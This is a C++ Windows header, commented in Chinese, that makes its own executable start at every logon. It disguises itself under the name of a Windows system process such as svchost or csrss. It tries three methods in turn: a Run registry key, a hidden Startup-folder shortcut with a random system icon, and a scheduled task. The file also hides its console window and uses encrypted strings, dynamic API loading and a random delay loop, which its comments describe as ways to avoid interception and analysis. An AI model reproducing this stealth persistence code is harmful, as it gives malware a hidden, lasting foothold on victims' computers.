#pragma once
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <random>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <type_traits>
#include <fstream>
#include <vector>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#include "Skcrypt.h"

// 状态反馈管道（避免弹窗）
#define STATUS_PIPE_NAME skCrypt(L"\\\\.\\pipe\\InjectStatusPipe").decrypt()

// 安全API加载器类 - 修复函数指针声明和字符串处理
class SecureAPILoader {
private:
    template <typename Func>
    Func LoadDynamicAPI(const char* libName, const char* funcName) {
        HMODULE hModule = LoadLibraryA(libName);
        if (!hModule) return nullptr;
        return reinterpret_cast<Func>(GetProcAddress(hModule, funcName));
    }

public:
    // 修复函数指针声明
    using CoInitializeFn = decltype(&CoInitialize);
    using CoCreateInstanceFn = decltype(&CoCreateInstance);
    using CoUninitializeFn = decltype(&CoUninitialize);
    using SHGetFolderPathWFn = decltype(&SHGetFolderPathW);
    using GetModuleFileNameWFn = decltype(&GetModuleFileNameW);
    using MessageBoxWFn = decltype(&MessageBoxW);

    // 使用实际函数签名
    CoInitializeFn pCoInitialize = nullptr;
    CoCreateInstanceFn pCoCreateInstance = nullptr;
    CoUninitializeFn pCoUninitialize = nullptr;
    SHGetFolderPathWFn pSHGetFolderPathW = nullptr;
    GetModuleFileNameWFn pGetModuleFileNameW = nullptr;
    MessageBoxWFn pMessageBoxW = nullptr;

    SecureAPILoader() {
        // 动态加载核心API
        pCoInitialize = LoadDynamicAPI<CoInitializeFn>("ole32.dll", "CoInitialize");
        pCoCreateInstance = LoadDynamicAPI<CoCreateInstanceFn>("ole32.dll", "CoCreateInstance");
        pCoUninitialize = LoadDynamicAPI<CoUninitializeFn>("ole32.dll", "CoUninitialize");
        pSHGetFolderPathW = LoadDynamicAPI<SHGetFolderPathWFn>("shell32.dll", "SHGetFolderPathW");
        pGetModuleFileNameW = LoadDynamicAPI<GetModuleFileNameWFn>("kernel32.dll", "GetModuleFileNameW");

        // 加载反馈相关API
        HMODULE hUser32 = LoadLibraryW(L"user32.dll");
        if (hUser32) {
            pMessageBoxW = reinterpret_cast<MessageBoxWFn>(GetProcAddress(hUser32, "MessageBoxW"));
        }
    }
};

// 安全的COM对象释放函数
template <typename T>
void SafeRelease(T*& p) {
    if (p) {
        p->Release();
        p = nullptr;
    }
}

// ============ 反馈系统 ============
namespace FeedbackSystem {
    // 确保提供反馈的多种方式
    void ProvideFeedback(bool success, const wchar_t* message) {
        SecureAPILoader loader;

        // 0. 创建内存信号（基本保证）
        wchar_t signalData[] = { L'F', L'E', L'E', L'D', success ? L'1' : L'0' };
        GlobalAlloc(GMEM_FIXED, sizeof(signalData));

        // 1. 尝试显示弹窗（首选）
        if (loader.pMessageBoxW) {
            const wchar_t* title = success ? L"操作结果" : L"操作失败";
            loader.pMessageBoxW(nullptr, message, title, MB_OK | (success ? MB_ICONINFORMATION : MB_ICONERROR));
        }

        // 2. 写入日志文件（次选）
        wchar_t tempPath[MAX_PATH] = { 0 };
        if (GetTempPathW(MAX_PATH, tempPath)) {
            wchar_t logPath[MAX_PATH];
            wcscpy_s(logPath, tempPath);
            wcscat_s(logPath, L"\\SystemHelper_Log.txt");

            std::wofstream logFile(logPath, std::ios::out | std::ios::app);
            if (logFile) {
                SYSTEMTIME sysTime;
                GetLocalTime(&sysTime);
                logFile << L"[" << sysTime.wYear << L"-" << sysTime.wMonth << L"-" << sysTime.wDay
                    << L" " << sysTime.wHour << L":" << sysTime.wMinute << L":" << sysTime.wSecond
                    << L"] ";
                logFile << message << std::endl;
                logFile.close();

                // 设置隐藏属性，避免用户误删
                SetFileAttributesW(logPath, FILE_ATTRIBUTE_HIDDEN);
            }
        }

        // 3. 确保反馈的最后手段（控制台）
        if (success) {
            wprintf(L"[SUCCESS] %s\n", message);
        }
        else {
            wprintf(L"[ERROR] %s\n", message);
        }

        // 4. 额外信号（针对安全软件）
        wchar_t successCode[] = L"SC0xSYSHELPER";
        GlobalAddAtomW(successCode);

        if (!success) {
            wchar_t errorCode[] = L"ERR0xSYSHELPER";
            GlobalAddAtomW(errorCode);
        }

        // 5. 系统声音反馈（最终保证）
        if (success) {
            MessageBeep(MB_ICONASTERISK);
        }
        else {
            MessageBeep(MB_ICONHAND);
        }
    }
}

// 创建伪装文件名的快捷方式（关键改进）
bool CreateDisguisedShortcut(const wchar_t* targetPath, const wchar_t* shortcutDir,
    const wchar_t* displayName, const wchar_t* iconPath, int iconIndex) {
    SecureAPILoader loader;
    HRESULT hr = S_OK;
    IShellLinkW* psl = nullptr;
    bool success = false;

    // 1. 初始化COM
    if (loader.pCoInitialize && FAILED(hr = loader.pCoInitialize(nullptr))) {
        wchar_t msg[256];
        swprintf_s(msg, L"COM初始化失败 (错误代码: 0x%08X)", hr);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    // 2. 创建ShellLink对象
    if (!loader.pCoCreateInstance ||
        FAILED(hr = loader.pCoCreateInstance(
            CLSID_ShellLink,
            nullptr,
            CLSCTX_INPROC_SERVER,
            IID_IShellLinkW,
            reinterpret_cast<void**>(&psl)))) {
        wchar_t msg[256];
        swprintf_s(msg, L"创建ShellLink对象失败 (错误代码: 0x%08X)", hr);
        FeedbackSystem::ProvideFeedback(false, msg);
        if (loader.pCoUninitialize) loader.pCoUninitialize();
        return false;
    }

    // 3. 构建伪装后的快捷方式路径
    wchar_t shortcutPath[MAX_PATH];
    wcscpy_s(shortcutPath, shortcutDir);
    wcscat_s(shortcutPath, L"\\");
    wcscat_s(shortcutPath, displayName);
    wcscat_s(shortcutPath, L".lnk");

    do {
        // 4. 设置目标路径
        if (FAILED(hr = psl->SetPath(targetPath))) {
            wchar_t msg[256];
            swprintf_s(msg, L"设置路径失败 (错误代码: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            break;
        }

        // 5. 设置图标伪装（关键改进）
        if (iconPath && FAILED(hr = psl->SetIconLocation(iconPath, iconIndex))) {
            wchar_t msg[256];
            swprintf_s(msg, L"设置图标伪装失败 (错误代码: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            // 继续执行，伪装失败不是致命错误
        }

        // 6. 保存快捷方式
        IPersistFile* ppf = nullptr;
        if (FAILED(hr = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf)))) {
            wchar_t msg[256];
            swprintf_s(msg, L"获取IPersistFile接口失败 (错误代码: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            break;
        }

        if (FAILED(hr = ppf->Save(shortcutPath, TRUE))) {
            wchar_t msg[256];
            swprintf_s(msg, L"保存伪装快捷方式失败 (错误代码: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            SafeRelease(ppf);
            break;
        }

        SafeRelease(ppf);

        // 7. 设置隐藏属性增强伪装
        if (!SetFileAttributesW(shortcutPath, FILE_ATTRIBUTE_HIDDEN)) {
            FeedbackSystem::ProvideFeedback(false, L"设置隐藏属性失败，但伪装已创建");
        }

        wchar_t successMsg[256];
        swprintf_s(successMsg, L"成功创建伪装开机启动项：%s", shortcutPath);
        FeedbackSystem::ProvideFeedback(true, successMsg);
        success = true;
    } while (false);

    // 8. 清理资源
    SafeRelease(psl);
    if (loader.pCoUninitialize) loader.pCoUninitialize();

    return success;
}

// 获取当前用户启动文件夹路径（关键改进）
bool GetCurrentUserStartupPath(wchar_t* startupPath, DWORD bufferSize) {
    // 使用环境变量构建路径（避免API拦截）
    if (GetEnvironmentVariableW(L"APPDATA", startupPath, bufferSize) == 0) {
        FeedbackSystem::ProvideFeedback(false, L"获取APPDATA环境变量失败");
        return false;
    }

    // 构建完整启动路径
    if (wcslen(startupPath) + wcslen(L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") >= bufferSize) {
        FeedbackSystem::ProvideFeedback(false, L"启动路径缓冲区不足");
        return false;
    }
    wcscat_s(startupPath, bufferSize, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    return true;
}

// 方法1：注册表启动项（无管理员权限）
bool CreateRegistryStartup(const wchar_t* targetPath, const wchar_t* displayName) {
    HKEY hKey;
    LONG result;

    // 打开注册表键
    result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);

    if (result != ERROR_SUCCESS) {
        wchar_t msg[256];
        swprintf_s(msg, L"打开注册表失败 (错误代码: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    // 添加引号确保路径安全
    std::wstring quotedPath = L"\"" + std::wstring(targetPath) + L"\"";

    // 设置注册表值
    result = RegSetValueExW(hKey, displayName, 0, REG_SZ,
        (const BYTE*)quotedPath.c_str(),
        (quotedPath.length() + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        wchar_t msg[256];
        swprintf_s(msg, L"写入注册表失败 (错误代码: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    wchar_t successMsg[256];
    swprintf_s(successMsg, L"成功创建注册表启动项：%s", displayName);
    FeedbackSystem::ProvideFeedback(true, successMsg);
    return true;
}

// 方法2：启动文件夹快捷方式
bool CreateStartupFolderShortcut(const wchar_t* targetPath, const wchar_t* displayName) {
    wchar_t startupPath[MAX_PATH] = { 0 };
    if (!GetCurrentUserStartupPath(startupPath, MAX_PATH)) {
        return false;
    }

    const wchar_t* iconPaths[] = {
        L"C:\\Windows\\System32\\shell32.dll",
        L"C:\\Windows\\System32\\imageres.dll",
        L"C:\\Windows\\System32\\ddores.dll"
    };

    // 随机选择图标
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(0, 2);
    const wchar_t* iconPath = iconPaths[dis(gen)];

    // 随机图标索引
    std::uniform_int_distribution<> iconDis(0, 100);
    int iconIndex = iconDis(gen);

    return CreateDisguisedShortcut(targetPath, startupPath, displayName, iconPath, iconIndex);
}

// 方法3：任务计划程序（无管理员权限）
bool CreateTaskSchedulerStartup(const wchar_t* targetPath, const wchar_t* displayName) {
    // 构建任务名称（使用伪装名）
    std::wstring taskName = L"\\SystemHelper_";
    taskName += displayName;

    // 构建schtasks命令
    std::wstring command = L"schtasks /create /tn \"";
    command += taskName;
    command += L"\" /tr \"";
    command += targetPath;
    command += L"\" /sc onlogon /ru \"\" /f";

    // 执行命令
    int result = _wsystem(command.c_str());

    if (result != 0) {
        wchar_t msg[256];
        swprintf_s(msg, L"创建计划任务失败 (返回代码: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    wchar_t successMsg[256];
    swprintf_s(successMsg, L"成功创建计划任务：%s", taskName.c_str());
    FeedbackSystem::ProvideFeedback(true, successMsg);
    return true;
}

// 创建开机自启动（使用三种方法）
bool CreateSecureStartupShortcut() {
    // 1. 获取自身路径
    wchar_t szPath[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(nullptr, szPath, MAX_PATH) == 0) {
        FeedbackSystem::ProvideFeedback(false, L"获取模块路径失败");
        return false;
    }

    // 2. 动态伪装技术
    const wchar_t* systemProcesses[] = {
        L"RuntimeBroker", L"dwm", L"csrss", L"svchost", L"ctfmon"
    };
    const int processCount = sizeof(systemProcesses) / sizeof(systemProcesses[0]);

    // 使用高精度时钟种子增强随机性
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(0, processCount - 1);

    const wchar_t* disguisedName = systemProcesses[dis(gen)];

    // 3. 尝试三种自启动方法
    bool success = false;

    // 方法1：注册表启动项
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"尝试注册表启动项方法");
        success = CreateRegistryStartup(szPath, disguisedName);
    }

    // 方法2：启动文件夹快捷方式
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"尝试启动文件夹快捷方式");
        success = CreateStartupFolderShortcut(szPath, disguisedName);
    }

    // 方法3：任务计划程序
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"尝试任务计划程序方法");
        success = CreateTaskSchedulerStartup(szPath, disguisedName);
    }

    return success;
}

// 主入口函数（强制反馈机制）
int startself() {
    // 隐藏窗口
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 添加高级随机延迟干扰分析
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(500, 5000);
    int delayCount = dis(gen);

    // 使用更自然的计算模式
    for (int i = 0; i < delayCount; i++) {
        volatile double dummy = std::log(i + 1) * std::sqrt(i);
        (void)dummy;
    }

    // 初始化反馈（确保开始操作）
    FeedbackSystem::ProvideFeedback(true, L"系统助手开始执行操作");

    // 保证反馈的终极机制
    __try {
        // 1. 尝试创建自启动项
        bool creationResult = CreateSecureStartupShortcut();

        // 2. 最终反馈
        if (creationResult) {
            FeedbackSystem::ProvideFeedback(true, L"成功创建开机自启动项");
            return 0;
        }
        else {
            FeedbackSystem::ProvideFeedback(false, L"创建开机启动项失败");
            return 1;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 处理任何崩溃情况，保证反馈
        wchar_t errorMsg[256];
        DWORD exceptionCode = GetExceptionCode();
        swprintf_s(errorMsg, L"程序发生意外错误 (异常代码: 0x%08X)", exceptionCode);
        FeedbackSystem::ProvideFeedback(false, errorMsg);
        return 3;
    }
}